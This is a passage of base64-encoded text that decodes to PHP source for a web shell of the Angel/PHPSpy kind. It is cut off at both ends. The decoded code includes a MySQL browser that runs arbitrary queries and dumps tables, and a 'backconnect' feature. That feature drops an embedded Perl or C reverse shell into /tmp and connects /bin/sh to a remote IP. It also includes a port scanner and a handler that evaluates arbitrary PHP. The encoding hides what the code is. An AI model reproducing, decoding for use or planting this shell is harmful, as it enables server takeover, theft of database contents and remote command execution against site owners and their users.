CgltYWtlaGlkZSgnb3JkZXInLCAkb3JkZXIpOwoJcCgnPHA+Jyk7CglwKCdEQkhvc3Q6Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nZGJob3N0Jywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiRkYmhvc3QpKTsKCXAoJ0RCVXNlcjonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnVzZXInLCdzaXplJz0+MTUsJ3ZhbHVlJz0+JGRidXNlcikpOwoJcCgnREJQYXNzOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RicGFzcycsJ3NpemUnPT4xNSwndmFsdWUnPT4kZGJwYXNzKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3ZhbHVlJz0+J0Nvbm5lY3QnLCd0eXBlJz0+J3N1Ym1pdCcsJ2NsYXNzJz0+J2J0JykpOwoJcCgnPC9wPicpOwoKCWlmICgkZGJob3N0ICYmICRkYnVzZXIgJiYgaXNzZXQoJGRicGFzcykpIHsKCQkkREIgPSBuZXcgREJfTXlTUUw7CgkJJERCLT5jaGFyc2V0ZGIgPSAkY2hhcnNldGRiOwoJCSREQi0+Y2hhcnNldCA9ICRjaGFyc2V0OwoJCSREQi0+Y29ubmVjdCgkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAkZGJuYW1lKTsKCQlwKCc8cCBjbGFzcz0icmVkIj5NeVNRTCAnLiREQi0+dmVyc2lvbigpLicgcnVubmluZyBpbiAnLiRkYmhvc3QuJyBhcyAnLiRkYnVzZXIuJ0AnLiRkYmhvc3QuJzwvcD4nKTsKCQkkaGlnaHZlciA9ICREQi0+dmVyc2lvbigpID4gJzQuMScgPyAxIDogMDsKCQkkcXVlcnkgPSAkREItPnF1ZXJ5KCJTSE9XIERBVEFCQVNFUyIpOwoJCSRkYnMgPSBhcnJheSgpOwoJCSRkYnNbXSA9ICctLSBTZWxlY3QgYSBkYXRhYmFzZSAtLSc7CgkJd2hpbGUoJGRiID0gJERCLT5mZXRjaCgkcXVlcnkpKSB7CgkJCSRkYnNbJGRiWydEYXRhYmFzZSddXSA9ICRkYlsnRGF0YWJhc2UnXTsKCQl9CgkJbWFrZXNlbGVjdChhcnJheSgnbmFtZSc9PidkYm5hbWUnLCdvcHRpb24nPT4kZGJzLCdzZWxlY3RlZCc9PiRkYm5hbWUsJ29uY2hhbmdlJz0+J3NldGRiKHRoaXMub3B0aW9uc1t0aGlzLnNlbGVjdGVkSW5kZXhdLnZhbHVlKScpKTsKCgkJaWYgKCRkYm5hbWUpIHsKCQkJcCgnPHA+Q3VycmVudCBkYWJhYmFzZTogPGEgaHJlZj0iamF2YXNjcmlwdDpzZXRkYihcJycuJGRibmFtZS4nXCcpOyI+Jy4kZGJuYW1lLic8L2E+Jyk7CgkJCWlmICgkdGFibGVuYW1lKSB7CgkJCQlwKCcgfCBDdXJyZW50IFRhYmxlOiA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJyk7Ij4nLiR0YWJsZW5hbWUuJzwvYT4gWyA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdzdHJ1Y3R1cmVcJyk7Ij5TdHJ1Y3R1cmU8L2E+IF0nKTsKCQkJfQoJCQlwKCc8L3A+Jyk7CgoJCQkkc3FsX3F1ZXJ5ID0gaXNzZXQoJFBbJ3NxbF9xdWVyeSddKSA/ICRQWydzcWxfcXVlcnknXSA6ICcnOwoKCQkJaWYgKCR0YWJsZW5hbWUgJiYgISRzcWxfcXVlcnkpIHsKCQkJCSRzcWxfcXVlcnkgPSAiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIExJTUlUIDAsIDMwIjsKCQkJfQoJCQlpZiAoJHRhYmxlbmFtZSAmJiAkZG9pbmcgPT0gJ3N0cnVjdHVyZScpIHsKCQkJCSRzcWxfcXVlcnkgPSAiU0hPVyBGVUxMIENPTFVNTlMgRlJPTSAkdGFibGVuYW1lO1xuIjsKCQkJCSRzcWxfcXVlcnkgLj0gIlNIT1cgSU5ERVggRlJPTSAkdGFibGVuYW1lOyI7CgkJCX0KCQkJcCgnPHA+PHRhYmxlIHdpZHRoPSIyMDAiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj48dHI+PHRkIGNvbHNwYW49IjIiPlJ1biBTUUwgcXVlcnkvcXVlcmllcyBvbiBkYXRhYmFzZSAnLiRkYm5hbWUuJzo8L3RkPjwvdHI+PHRyPjx0ZD48dGV4dGFyZWEgbmFtZT0ic3FsX3F1ZXJ5IiBjbGFzcz0iYXJlYSIgc3R5bGU9IndpZHRoOjYwMHB4O2hlaWdodDo1MHB4O292ZXJmbG93OmF1dG87Ij4nLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9xdWVyeSxFTlRfUVVPVEVTKS4nPC90ZXh0YXJlYT48L3RkPjx0ZCBzdHlsZT0icGFkZGluZzowIDVweDsiPjxpbnB1dCBjbGFzcz0iYnQiIG9uY2xpY2s9IiQoXCdkb2luZ1wnKS52YWx1ZT1cJ1wnIiBzdHlsZT0iaGVpZ2h0OjUwcHg7IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJRdWVyeSIgLz48L3RkPjwvdHI+PC90YWJsZT48L3A+Jyk7CgkJCWlmICgkc3FsX3F1ZXJ5KSB7CgkJCQkkcXVlcnlzID0gQGV4cGxvZGUoJzsnLCRzcWxfcXVlcnkpOwoJCQkJZm9yZWFjaCgkcXVlcnlzIGFzICRudW09PiRxdWVyeSkgewoJCQkJCWlmICgkcXVlcnkpIHsKCQkJCQkJcCgiPHAgY2xhc3M9XCJyZWQgYlwiPlF1ZXJ5I3skbnVtfSA6ICIuaHRtbHNwZWNpYWxjaGFycygkcXVlcnksRU5UX1FVT1RFUykuIjwvcD4iKTsKCQkJCQkJc3dpdGNoKCREQi0+cXVlcnlfcmVzKCRxdWVyeSkpCgkJCQkJCXsKCQkJCQkJCWNhc2UgMDoKCQkJCQkJCQlwKCc8aDI+Jy4kREItPmhhbHQoJ0Vycm9yJykuJzwvaDI+Jyk7CgkJCQkJCQkJYnJlYWs7CQoJCQkJCQkJY2FzZSAxOgoJCQkJCQkJCSRyZXN1bHQgPSAkREItPnF1ZXJ5KCRxdWVyeSk7CgkJCQkJCQkJJHRhdG9sID0gJERCLT5udW1fcm93cygkcmVzdWx0KTsKCQkJCQkJCQlwKCc8dGFibGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjAiPicpOwoJCQkJCQkJCXAoJzx0ciBjbGFzcz0iaGVhZCI+Jyk7CgkJCQkJCQkJJGZpZWxkbnVtID0gQG15c3FsX251bV9maWVsZHMoJHJlc3VsdCk7CgkJCQkJCQkJZm9yKCRpPTA7JGk8JGZpZWxkbnVtOyRpKyspewoJCQkJCQkJCQlwKCc8dGQgbm93cmFwPicuQG15c3FsX2ZpZWxkX25hbWUoJHJlc3VsdCwgJGkpLic8L3RkPicpOwoJCQkJCQkJCX0KCQkJCQkJCQlwKCc8L3RyPicpOwoJCQkJCQkJCQoJCQkJCQkJCWlmICghJHRhdG9sKSB7CgkJCQkJCQkJCXAoJzx0ciBjbGFzcz0iYWx0MiIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnYWx0MlwnOyI+PHRkIG5vd3JhcCBjb2xzcGFuPSInLiRmaWVsZG51bS4nIiBjbGFzcz0icmVkIGIiPk5vIHJlY29yZHM8L3RkPjwvdHI+Jyk7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJd2hpbGUoJG1uID0gJERCLT5mZXRjaCgkcmVzdWx0KSl7CgkJCQkJCQkJCQkkdGhpc2JnID0gYmcoKTsKCQkJCQkJCQkJCXAoJzx0ciBjbGFzcz0iJy4kdGhpc2JnLiciIG9ubW91c2VvdmVyPSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvY3VzXCc7IiBvbm1vdXNlb3V0PSJ0aGlzLmNsYXNzTmFtZT1cJycuJHRoaXNiZy4nXCc7Ij4nKTsKCQkJCQkJCQkJCWZvcmVhY2goJG1uIGFzICRrZXk9PiRpbnNpZGUpewoJCQkJCQkJCQkJCXAoJzx0ZCBub3dyYXA+Jy4oKCRpbnNpZGUgPT0gbnVsbCkgPyAnPGk+bnVsbDwvaT4nIDogaHRtbF9jbGVhbigkaW5zaWRlKSkuJzwvdGQ+Jyk7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCQlwKCc8L3RyPicpOwoJCQkJCQkJCQkJdW5zZXQoJGIxKTsKCQkJCQkJCQkJfQoJCQkJCQkJCX0KCQkJCQkJCQlwKCc8L3RhYmxlPicpOwoJCQkJCQkJCWJyZWFrOwoJCQkJCQkJY2FzZSAyOgoJCQkJCQkJCXAoJzxoMj5BZmZlY3RlZCBSb3dzIDogJy4kREItPmFmZmVjdGVkX3Jvd3MoKS4nPC9oMj4nKTsKCQkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfSBlbHNlIHsKCQkJCSRxdWVyeSA9ICREQi0+cXVlcnkoIlNIT1cgVEFCTEUgU1RBVFVTIik7CgkJCQkkdGFibGVfbnVtID0gJHRhYmxlX3Jvd3MgPSAkZGF0YV9zaXplID0gMDsKCQkJCSR0YWJsZWRiID0gYXJyYXkoKTsKCQkJCXdoaWxlKCR0YWJsZSA9ICREQi0+ZmV0Y2goJHF1ZXJ5KSkgewoJCQkJCSRkYXRhX3NpemUgPSAkZGF0YV9zaXplICsgJHRhYmxlWydEYXRhX2xlbmd0aCddOwoJCQkJCSR0YWJsZV9yb3dzID0gJHRhYmxlX3Jvd3MgKyAkdGFibGVbJ1Jvd3MnXTsKCQkJCQkkdGFibGVfbnVtKys7CgkJCQkJJHRhYmxlZGJbXSA9ICR0YWJsZTsKCQkJCX0KCQkJCSRkYXRhX3NpemUgPSBzaXplY291bnQoJGRhdGFfc2l6ZSk7CgkJCQl1bnNldCgkdGFibGUpOwoJCQkJaWYgKGNvdW50KCR0YWJsZWRiKSkgewoJCQkJCWlmICgkaGlnaHZlcikgewoJCQkJCQkkZGJfZW5naW5lID0gJERCLT5mZXRjaCgkREItPnF1ZXJ5KCJTSE9XIFZBUklBQkxFUyBMSUtFICdzdG9yYWdlX2VuZ2luZSc7IikpOwkJCQkJCQoJCQkJCQkkZGJfY29sbGF0aW9uID0gJERCLT5mZXRjaCgkREItPnF1ZXJ5KCJTSE9XIFZBUklBQkxFUyBMSUtFICdjb2xsYXRpb25fZGF0YWJhc2UnOyIpKTsKCQkJCQl9CgkJCQkJJHNvcnQgPSBhcnJheSgnTmFtZScsIDEpOwoJCQkJCWlmKCRvcmRlcikgewoJCQkJCQlpZihwcmVnX21hdGNoKCchc18oW0Etel9dKylfKFxkezF9KSEnLCAkb3JkZXIsICRtYXRjaCkpIHsKCQkJCQkJCSRzb3J0ID0gYXJyYXkoJG1hdGNoWzFdLCAoaW50KSRtYXRjaFsyXSk7CgkJCQkJCX0KCQkJCQl9CgkJCQkJdXNvcnQoJHRhYmxlZGIsICdjbXAnKTsKCQkJCQlwKCc8dGFibGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiIGlkPSJsaXN0cyI+Jyk7CgkJCQkJcCgnPHRyIGNsYXNzPSJoZWFkIj4nKTsKCQkJCQlwKCc8dGQgd2lkdGg9IjIlIj48aW5wdXQgbmFtZT0iY2hrYWxsIiB2YWx1ZT0ib24iIHR5cGU9ImNoZWNrYm94IiBvbmNsaWNrPSJjaGVja2FsbCh0aGlzLmZvcm0pIiAvPjwvdGQ+Jyk7CgkJCQkJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0c29ydChcJ3NfTmFtZV8nLigkc29ydFsxXT8wOjEpLidcJyk7Ij5OYW1lPC9hPiAnLigkb3JkZXIgPT0gJ3NfTmFtZV8wJyA/ICRkY2hhciA6ICcnKS4oJG9yZGVyID09ICdzX05hbWVfMScgfHwgISRvcmRlciA/ICR1Y2hhciA6ICcnKS4nPC90ZD4nKTsKCQkJCQlwKCc8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDpzZXRzb3J0KFwnc19Sb3dzXycuKCRzb3J0WzFdPzA6MSkuJ1wnKTsiPlJvd3M8L2E+Jy4oJG9yZGVyID09ICdzX1Jvd3NfMCcgPyAkZGNoYXIgOiAnJykuKCRvcmRlciA9PSAnc19Sb3dzXzEnID8gJHVjaGFyIDogJycpLic8L3RkPicpOwoJCQkJCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnNldHNvcnQoXCdzX0RhdGFfbGVuZ3RoXycuKCRzb3J0WzFdPzA6MSkuJ1wnKTsiPkRhdGFfbGVuZ3RoPC9hPicuKCRvcmRlciA9PSAnc19EYXRhX2xlbmd0aF8wJyA/ICRkY2hhciA6ICcnKS4oJG9yZGVyID09ICdzX0RhdGFfbGVuZ3RoXzEnID8gJHVjaGFyIDogJycpLic8L3RkPicpOwoJCQkJCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnNldHNvcnQoXCdzX0NyZWF0ZV90aW1lXycuKCRzb3J0WzFdPzA6MSkuJ1wnKTsiPkNyZWF0ZV90aW1lPC9hPicuKCRvcmRlciA9PSAnc19DcmVhdGVfdGltZV8wJyA/ICRkY2hhciA6ICcnKS4oJG9yZGVyID09ICdzX0NyZWF0ZV90aW1lXzEnID8gJHVjaGFyIDogJycpLic8L3RkPicpOwoJCQkJCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnNldHNvcnQoXCdzX1VwZGF0ZV90aW1lXycuKCRzb3J0WzFdPzA6MSkuJ1wnKTsiPlVwZGF0ZV90aW1lPC9hPicuKCRvcmRlciA9PSAnc19VcGRhdGVfdGltZV8wJyA/ICRkY2hhciA6ICcnKS4oJG9yZGVyID09ICdzX1VwZGF0ZV90aW1lXzEnID8gJHVjaGFyIDogJycpLic8L3RkPicpOwoJCQkJCWlmICgkaGlnaHZlcikgewoJCQkJCQlwKCc8dGQ+RW5naW5lPC90ZD4nKTsKCQkJCQkJcCgnPHRkPkNvbGxhdGlvbjwvdGQ+Jyk7CgkJCQkJfQoJCQkJCXAoJzx0ZD5PdGhlcjwvdGQ+Jyk7CgkJCQkJcCgnPC90cj4nKTsKCQkJCQlmb3JlYWNoICgkdGFibGVkYiBhcyAka2V5ID0+ICR0YWJsZSkgewoJCQkJCQkkdGhpc2JnID0gYmcoKTsKCQkJCQkJcCgnPHRyIGNsYXNzPSInLiR0aGlzYmcuJyIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnJy4kdGhpc2JnLidcJzsiPicpOwoJCQkJCQlwKCc8dGQgYWxpZ249ImNlbnRlciIgd2lkdGg9IjIlIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9ImJha190YWJsZVtdIiB2YWx1ZT0iJy4kdGFibGVbJ05hbWUnXS4nIiAvPjwvdGQ+Jyk7CgkJCQkJCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVbJ05hbWUnXS4nXCcpOyI+Jy4kdGFibGVbJ05hbWUnXS4nPC9hPjwvdGQ+Jyk7CgkJCQkJCXAoJzx0ZD4nLiR0YWJsZVsnUm93cyddLicmbmJzcDs8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Jy5zaXplY291bnQoJHRhYmxlWydEYXRhX2xlbmd0aCddKS4nPC90ZD4nKTsKCQkJCQkJcCgnPHRkPicuJHRhYmxlWydDcmVhdGVfdGltZSddLicmbmJzcDs8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Jy4kdGFibGVbJ1VwZGF0ZV90aW1lJ10uJyZuYnNwOzwvdGQ+Jyk7CgkJCQkJCWlmICgkaGlnaHZlcikgewoJCQkJCQkJcCgnPHRkPicuJHRhYmxlWydFbmdpbmUnXS4nPC90ZD4nKTsKCQkJCQkJCXAoJzx0ZD4nLiR0YWJsZVsnQ29sbGF0aW9uJ10uJzwvdGQ+Jyk7CgkJCQkJCX0KCQkJCQkJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZVsnTmFtZSddLidcJywgXCdzdHJ1Y3R1cmVcJyk7Ij5TdHJ1Y3R1cmU8L2E+PC90ZD4nKTsKCQkJCQkJcCgnPC90cj4nKTsKCQkJCQl9CgkJCQkJcCgnPHRyIGNsYXNzPSJoZWFkIj4nKTsKCQkJCQlwKCc8dGQgd2lkdGg9IjIlIj4mbmJzcDs8L3RkPicpOwoJCQkJCXAoJzx0ZD4nLiR0YWJsZV9udW0uJyB0YWJsZShzKTwvdGQ+Jyk7CgkJCQkJcCgnPHRkPicuJHRhYmxlX3Jvd3MuJzwvdGQ+Jyk7CgkJCQkJcCgnPHRkPicuJGRhdGFfc2l6ZS4nPC90ZD4nKTsKCQkJCQlwKCc8dGQ+Jm5ic3A7PC90ZD4nKTsKCQkJCQlwKCc8dGQ+Jm5ic3A7PC90ZD4nKTsKCQkJCQlpZiAoJGhpZ2h2ZXIpIHsKCQkJCQkJcCgnPHRkPicuJGRiX2VuZ2luZVsnVmFsdWUnXS4nPC90ZD4nKTsKCQkJCQkJcCgnPHRkPicuJGRiX2NvbGxhdGlvblsnVmFsdWUnXS4nPC90ZD4nKTsKCQkJCQl9CgkJCQkJcCgnPHRkPiZuYnNwOzwvdGQ+Jyk7CgkJCQkJcCgnPC90cj4nKTsKCQkJCQlwKCI8dHIgY2xhc3M9XCIiLmJnKCkuIlwiPjx0ZCBjb2xzcGFuPVwiIi4oJGhpZ2h2ZXIgPyA5IDogNykuIlwiPjxpbnB1dCBuYW1lPVwic2F2ZWFzZmlsZVwiIHZhbHVlPVwiMVwiIHR5cGU9XCJjaGVja2JveFwiIC8+IFNhdmUgYXMgZmlsZSA8aW5wdXQgY2xhc3M9XCJpbnB1dFwiIG5hbWU9XCJiYWtfcGF0aFwiIHZhbHVlPVwiIi5TQV9ST09ULiRkYm5hbWUuIi5zcWxcIiB0eXBlPVwidGV4dFwiIHNpemU9XCI2MFwiIC8+IDxpbnB1dCBjbGFzcz1cImJ0XCIgdHlwZT1cImJ1dHRvblwiIHZhbHVlPVwiRXhwb3J0IHNlbGVjdGlvbiB0YWJsZVwiIG9uY2xpY2s9XCIkKCdkb2luZycpLnZhbHVlPSdkdW1wJzskKCdkYmZvcm0nKS5zdWJtaXQoKTtcIiAvPjwvdGQ+PC90cj4iKTsKCQkJCQlwKCI8L3RhYmxlPiIpOwoJCQkJfSBlbHNlIHsKCQkJCQlwKCc8cCBjbGFzcz0icmVkIGIiPk5vIHRhYmxlczwvcD4nKTsKCQkJCX0KCQkJCSREQi0+ZnJlZV9yZXN1bHQoJHF1ZXJ5KTsKCQkJfQoJCX0KCQkkREItPmNsb3NlKCk7Cgl9Cglmb3JtZm9vdCgpOwp9Ly9lbmQgbXlzcWwKCmVsc2VpZiAoJGFjdCA9PSAnYmFja2Nvbm5lY3QnKSB7CgoJISRwMiAmJiAkcDIgPSAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsKCSEkcDMgJiYgJHAzID0gJzEyMzQ1JzsKCSR1c2VkYiA9IGFycmF5KCdwZXJsJz0+J3BlcmwnLCdjJz0+J2MnKTsKCgkkYmFja19jb25uZWN0PSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkdOdFpEMGdJbXg1Ym5naU93MEtKSE41YzNSbGJUMGdKMlZqYUc4Z0ltQjFibUZ0WlNBdFlXQWlPMlZqIi4KCQkiYUc4Z0ltQnBaR0FpT3k5aWFXNHZjMmduT3cwS0pEQTlKR050WkRzTkNpUjBZWEpuWlhROUpFRlNSMVpiTUYwN0RRb2tjRzl5ZEQwa1FWSkhWbHN4WFRzTkNpUnBZV1JrY2oxcGJtVjBYMkYwYjI0b0pIUiIuCgkJImhjbWRsZENrZ2ZId2daR2xsS0NKRmNuSnZjam9nSkNGY2JpSXBPdzBLSkhCaFpHUnlQWE52WTJ0aFpHUnlYMmx1S0NSd2IzSjBMQ0FrYVdGa1pISXBJSHg4SUdScFpTZ2lSWEp5YjNJNklDUWhYRzRpS1QiLgoJCSJzTkNpUndjbTkwYnoxblpYUndjbTkwYjJKNWJtRnRaU2duZEdOd0p5azdEUXB6YjJOclpYUW9VMDlEUzBWVUxDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLU0I4ZkNCa2FXVW9JIi4KCQkia1Z5Y205eU9pQWtJVnh1SWlrN0RRcGpiMjV1WldOMEtGTlBRMHRGVkN3Z0pIQmhaR1J5S1NCOGZDQmthV1VvSWtWeWNtOXlPaUFrSVZ4dUlpazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaSIuCgkJIktUc05DbTl3Wlc0b1UxUkVUMVZVTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVSVkpTTENBaVBpWlRUME5MUlZRaUtUc05Dbk41YzNSbGJTZ2tjM2x6ZEdWdEtUc05DbU5zYjNObEtGTlVSRWwiLgoJCSJPS1RzTkNtTnNiM05sS0ZOVVJFOVZWQ2s3RFFwamJHOXpaU2hUVkVSRlVsSXBPdz09IjsKCSRiYWNrX2Nvbm5lY3RfYz0iSTJsdVkyeDFaR1VnUEhOMFpHbHZMbWcrRFFvamFXNWpiSFZrWlNBOGMzbHpMM052WTJ0bGRDNW9QZzBLSTJsdVkyeDFaR1VnUEc1bGRHbHVaWFF2YVc0dWFENE5DbWx1ZEMiLgoJCSJCdFlXbHVLR2x1ZENCaGNtZGpMQ0JqYUdGeUlDcGhjbWQyVzEwcERRcDdEUW9nYVc1MElHWmtPdzBLSUhOMGNuVmpkQ0J6YjJOcllXUmtjbDlwYmlCemFXNDdEUW9nWTJoaGNpQnliWE5iTWpGZFBTSnliIi4KCQkiU0F0WmlBaU95QU5DaUJrWVdWdGIyNG9NU3d3S1RzTkNpQnphVzR1YzJsdVgyWmhiV2xzZVNBOUlFRkdYMGxPUlZRN0RRb2djMmx1TG5OcGJsOXdiM0owSUQwZ2FIUnZibk1vWVhSdmFTaGhjbWQyV3pKZCIuCgkJIktTazdEUW9nYzJsdUxuTnBibDloWkdSeUxuTmZZV1JrY2lBOUlHbHVaWFJmWVdSa2NpaGhjbWQyV3pGZEtUc2dEUW9nWW5wbGNtOG9ZWEpuZGxzeFhTeHpkSEpzWlc0b1lYSm5kbHN4WFNrck1TdHpkSEoiLgoJCSJzWlc0b1lYSm5kbHN5WFNrcE95QU5DaUJtWkNBOUlITnZZMnRsZENoQlJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dTVkJRVWs5VVQxOVVRMUFwSURzZ0RRb2dhV1lnS0NoamIyNXVaV04wS0daa0xDIi4KCQkiQW9jM1J5ZFdOMElITnZZMnRoWkdSeUlDb3BJQ1p6YVc0c0lITnBlbVZ2WmloemRISjFZM1FnYzI5amEyRmtaSElwS1NrOE1Da2dldzBLSUNBZ2NHVnljbTl5S0NKYkxWMGdZMjl1Ym1WamRDZ3BJaWs3RCIuCgkJIlFvZ0lDQmxlR2wwS0RBcE93MEtJSDBOQ2lCemRISmpZWFFvY20xekxDQmhjbWQyV3pCZEtUc05DaUJ6ZVhOMFpXMG9jbTF6S1RzZ0lBMEtJR1IxY0RJb1ptUXNJREFwT3cwS0lHUjFjRElvWm1Rc0lERXAiLgoJCSJPdzBLSUdSMWNESW9abVFzSURJcE93MEtJR1Y0WldOc0tDSXZZbWx1TDNOb0lpd2ljMmdnTFdraUxDQk9WVXhNS1RzTkNpQmpiRzl6WlNobVpDazdJQTBLZlE9PSI7CgoJaWYgKCRwMSA9PSAnc3RhcnQnICYmICRwMiAmJiAkcDMgJiYgJHA0KXsKCQlpZiAoJHA0ID09ICdwZXJsJykgewoJCQljZignL3RtcC9hbmdlbF9iYycsJGJhY2tfY29ubmVjdCk7CgkJCSRyZXMgPSBleGVjdXRlKHdoaWNoKCdwZXJsJykuIiAvdG1wL2FuZ2VsX2JjICIuJHAyLiIgIi4kcDMuIiAmIik7CgkJfSBlbHNlIHsKCQkJY2YoJy90bXAvYW5nZWxfYmMuYycsJGJhY2tfY29ubmVjdF9jKTsKCQkJJHJlcyA9IGV4ZWN1dGUoJ2djYyAtbyAvdG1wL2FuZ2VsX2JjIC90bXAvYW5nZWxfYmMuYycpOwoJCQlAdW5saW5rKCcvdG1wL2FuZ2VsX2JjLmMnKTsKCQkJJHJlcyA9IGV4ZWN1dGUoIi90bXAvYW5nZWxfYmMgIi4kcDIuIiAiLiRwMy4iICYiKTsKCQl9CgkJbSgnTm93IHNjcmlwdCB0cnkgY29ubmVjdCB0byAnLiRwMi4nOicuJHAzLicgLi4uJyk7Cgl9CgoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0JhY2sgQ29ubmVjdCcsICdvbnN1Ym1pdCc9PidnKFwnYmFja2Nvbm5lY3RcJyxudWxsLFwnc3RhcnRcJyx0aGlzLnAyLnZhbHVlLHRoaXMucDMudmFsdWUsdGhpcy5wNC52YWx1ZSk7cmV0dXJuIGZhbHNlOycpKTsKCXAoJzxwPicpOwoJcCgnWW91ciBJUDonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidwMicsJ3NpemUnPT4yMCwndmFsdWUnPT4kcDIpKTsKCXAoJ1lvdXIgUG9ydDonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidwMycsJ3NpemUnPT4xNSwndmFsdWUnPT4kcDMpKTsKCXAoJ1VzZTonKTsKCW1ha2VzZWxlY3QoYXJyYXkoJ25hbWUnPT4ncDQnLCdvcHRpb24nPT4kdXNlZGIsJ3NlbGVjdGVkJz0+JHA0KSk7CgltYWtlaW5wdXQoYXJyYXkoJ3ZhbHVlJz0+J1N0YXJ0JywndHlwZSc9PidzdWJtaXQnLCdjbGFzcyc9PididCcpKTsKCXAoJzwvcD4nKTsKCWZvcm1mb290KCk7Cn0vL2VuZAoKZWxzZWlmICgkYWN0ID09ICdwb3J0c2NhbicpIHsKCSEkcDIgJiYgJHAyID0gJzEyNy4wLjAuMSc7CgkhJHAzICYmICRwMyA9ICcyMSw4MCwxMzUsMTM5LDQ0NSwxNDMzLDMzMDYsMzM4OSw1NjMxLDQzOTU4JzsKCWZvcm1oZWFkKGFycmF5KCd0aXRsZSc9PidQb3J0IFNjYW4nLCAnb25zdWJtaXQnPT4nZyhcJ3BvcnRzY2FuXCcsbnVsbCxcJ3N0YXJ0XCcsdGhpcy5wMi52YWx1ZSx0aGlzLnAzLnZhbHVlKTtyZXR1cm4gZmFsc2U7JykpOwoJcCgnPHA+Jyk7CglwKCdJUDonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidwMicsJ3NpemUnPT4yMCwndmFsdWUnPT4kcDIpKTsKCXAoJ1BvcnQ6Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4ncDMnLCdzaXplJz0+ODAsJ3ZhbHVlJz0+JHAzKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3ZhbHVlJz0+J1NjYW4nLCd0eXBlJz0+J3N1Ym1pdCcsJ2NsYXNzJz0+J2J0JykpOwoJcCgnPC9wPicpOwoJZm9ybWZvb3QoKTsKCglpZiAoJHAxID09ICdzdGFydCcpIHsKCQlwKCc8aDI+UmVzdWx0ICZyYXF1bzs8L2gyPicpOwoJCXAoJzx1bCBjbGFzcz0iaW5mbyI+Jyk7CgkJZm9yZWFjaChleHBsb2RlKCcsJywgJHAzKSBhcyAkcG9ydCkgewoJCQkkZnAgPSBAZnNvY2tvcGVuKCRwMiwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMSk7IAoJCQlpZiAoISRmcCkgewoJCQkJcCgnPGxpPicuJHAyLic6Jy4kcG9ydC4nIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSA8c3BhbiBjbGFzcz0iYiI+Q2xvc2U8L3NwYW4+PC9saT4nKTsKCQkgICB9IGVsc2UgewoJCQkJcCgnPGxpPicuJHAyLic6Jy4kcG9ydC4nIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSA8c3BhbiBjbGFzcz0icmVkIGIiPk9wZW48L3NwYW4+PC9saT4nKTsKCQkJCUBmY2xvc2UoJGZwKTsKCQkgICB9IAoJCX0KCQlwKCc8L3VsPicpOwoJfQp9CgplbHNlaWYgKCRhY3QgPT0gJ2V2YWwnKSB7CgkkcGhwY29kZSA9IHRyaW0oJHAxKTsKCWlmKCRwaHBjb2RlKXsKCQlpZiAoIXByZWdfbWF0Y2goJyM8XD8jc2knLCAkcGhwY29kZSkpIHsKCQkJJHBocGNvZGUgPSAiPD9waHBcblxueyRwaHBjb2RlfVxuXG4/PiI7CgkJfQoJCWV2YWwoIj8iLiI+JHBocGNvZGU8PyIpOwoJfQoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0V2YWwgUEhQIENvZGUnLCAnb25zdWJtaXQnPT4nZyhcJ2V2YWxcJyxudWxsLHRoaXMucDEudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CgltYWtldGV4dChhcnJheSgndGl0bGUnPT4nUEhQIENvZGUnLC